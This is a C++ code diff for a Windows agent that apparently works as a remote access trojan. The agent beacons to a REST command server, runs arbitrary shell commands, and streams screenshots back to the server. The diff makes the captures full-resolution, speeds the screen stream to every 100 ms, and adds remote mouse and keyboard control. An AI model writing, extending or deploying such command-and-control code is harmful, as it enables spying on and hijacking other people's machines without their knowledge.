@@ -96,7 +96,7 @@ int GetEncoderClsid(const WCHAR* format, CLSID* pClsid) {
 std::string takeScreenshot() {
     int w = GetSystemMetrics(SM_CXSCREEN);
     int h = GetSystemMetrics(SM_CYSCREEN);
-    int sw = w/4, sh = h/4;
+    int sw = w, sh = h;
     HDC hScreen = GetDC(0);
     HDC hMem = CreateCompatibleDC(hScreen);
     HBITMAP hBmp = CreateCompatibleBitmap(hScreen, sw, sh);
@@ -175,6 +175,40 @@ std::string extractJson(const std::string& json, const std::string& key) {
     return json.substr(valStart, valEnd - valStart);
 }
 
+std::string handleMouse(const std::string& payload) {
+    std::string xs=extractJson(payload,"x");
+    std::string ys=extractJson(payload,"y");
+    std::string action=extractJson(payload,"action");
+    if(xs.empty()||ys.empty()||action.empty()) return "bad_payload";
+    int x=std::stoi(xs);
+    int y=std::stoi(ys);
+    int sw=GetSystemMetrics(SM_CXSCREEN);
+    int sh=GetSystemMetrics(SM_CYSCREEN);
+    DWORD f=MOUSEEVENTF_ABSOLUTE;
+    if(action=="move") f|=MOUSEEVENTF_MOVE;
+    else if(action=="down") f|=MOUSEEVENTF_LEFTDOWN;
+    else if(action=="up") f|=MOUSEEVENTF_LEFTUP;
+    else return "bad_action";
+    INPUT in={0};in.type=INPUT_MOUSE;
+    in.mi.dx=(x*65535)/sw;
+    in.mi.dy=(y*65535)/sh;
+    in.mi.dwFlags=f;
+    SendInput(1,&in,sizeof(in));
+    return "ok";
+}
+
+std::string handleKeyboard(const std::string& payload) {
+    std::string ks=extractJson(payload,"key");
+    std::string action=extractJson(payload,"action");
+    if(ks.empty()||action.empty()) return "bad_payload";
+    WORD vk=(WORD)std::stoi(ks);
+    INPUT in={0};in.type=INPUT_KEYBOARD;
+    in.ki.wVk=vk;
+    if(action=="up") in.ki.dwFlags|=KEYEVENTF_KEYUP;
+    SendInput(1,&in,sizeof(in));
+    return "ok";
+}
+
 void sendPing() {
     std::string body = "{\"computer\":\"" + computerName + "\"}";
     httpsPost("/rest/v1/pings", body);
@@ -182,9 +216,9 @@ void sendPing() {
 
 DWORD WINAPI pollThread(LPVOID) {
     Sleep(3000);
-    sendPing();
     while(true) {
         Sleep(2000);
+        try { sendPing(); } catch(...) {}
         try {
             std::string path = "/rest/v1/commands?computer=eq." + computerName + "&status=eq.pending&order=id.asc&limit=1";
             std::string resp = httpsGet(path);
@@ -196,19 +230,27 @@ DWORD WINAPI pollThread(LPVOID) {
             std::string patchBody = "{\"status\":\"running\"}";
             httpsPatch("/rest/v1/commands?id=eq." + id, patchBody);
             std::string result = "";
-            if (type == "screenshot") {
-                result = takeScreenshot();
-            } else if (type == "cmd") {
-                result = execCmd(payload.empty() ? "whoami" : payload);
-            } else if (type == "screen_start") {
-                screenRunning = true;
-                result = "started";
-            } else if (type == "screen_stop") {
-                screenRunning = false;
-                result = "stopped";
-            } else if (type == "screen") {
-                result = takeScreenshot();
-            }
+            try {
+                if (type == "screenshot") {
+                    result = takeScreenshot();
+                } else if (type == "cmd") {
+                    result = execCmd(payload.empty() ? "whoami" : payload);
+                } else if (type == "screen_start") {
+                    screenRunning = true;
+                    result = "started";
+                } else if (type == "screen_stop") {
+                    screenRunning = false;
+                    result = "stopped";
+                } else if (type == "mouse") {
+                    result = handleMouse(payload);
+                } else if (type == "keyboard") {
+                    result = handleKeyboard(payload);
+                } else if (type == "screen") {
+                    result = takeScreenshot();
+                } else {
+                    result = "unknown_type";
+                }
+            } catch(...) { result = "exec_err"; }
             std::string escaped = jsonEscape(result);
             std::string resBody = "{\"status\":\"done\",\"result\":\"" + escaped + "\"}";
             httpsPatch("/rest/v1/commands?id=eq." + id, resBody);
@@ -219,18 +261,13 @@ DWORD WINAPI pollThread(LPVOID) {
 
 DWORD WINAPI screenThread(LPVOID) {
     while(true) {
-        Sleep(400);
+        Sleep(100);
         if(!screenRunning) continue;
         try {
             std::string b64 = takeScreenshot();
-            std::string body = "{\"computer\":\"" + computerName + "\",\"type\":\"screen\",\"payload\":\"\",\"status\":\"pending\"}";
-            std::string resp = httpsPost("/rest/v1/commands", body);
-            std::string id = extractJson(resp, "id");
-            if (!id.empty()) {
-                std::string escaped = jsonEscape(b64);
-                std::string resBody = "{\"status\":\"done\",\"result\":\"" + escaped + "\"}";
-                httpsPatch("/rest/v1/commands?id=eq." + id, resBody);
-            }
+            std::string escaped = jsonEscape(b64);
+            std::string body = "{\"computer\":\"" + computerName + "\",\"type\":\"screen\",\"payload\":\"\",\"status\":\"done\",\"result\":\"" + escaped + "\"}";
+            httpsPost("/rest/v1/commands", body);
         } catch(...) {}
     }
     return 0;
